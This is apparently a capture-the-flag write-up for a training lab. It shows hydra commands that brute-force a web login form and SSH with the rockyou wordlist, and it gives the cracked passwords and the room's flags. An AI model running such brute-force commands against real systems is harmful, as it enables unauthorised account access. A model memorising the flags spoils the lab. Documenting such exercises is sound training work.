# Hydra

## Website
By using the given command as a baseline for our command and using the `rockyou.txt` password list we can create the following command: `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.76.21 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V`. Running it will quickly return us a result of `sunshine` for the password of `molly`. Using this we can see that the flag is: `THM{2673a7dd116de68e85c48ec0b1f2612e}`.

## SSH
By using the given command as a baseline for our command and using the `rockyou.txt` password list we can create the following command: `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.76.21 -t 10 ssh -V`. Running it will return us a result of `butterfly` for the password of `molly`. Using this we can `ssh` into `molly@10.10.76.21` and simply `cat` out the file in the initial directory to get the flag: `THM{c8eeb0468febbadea859baeb33b2541b}`.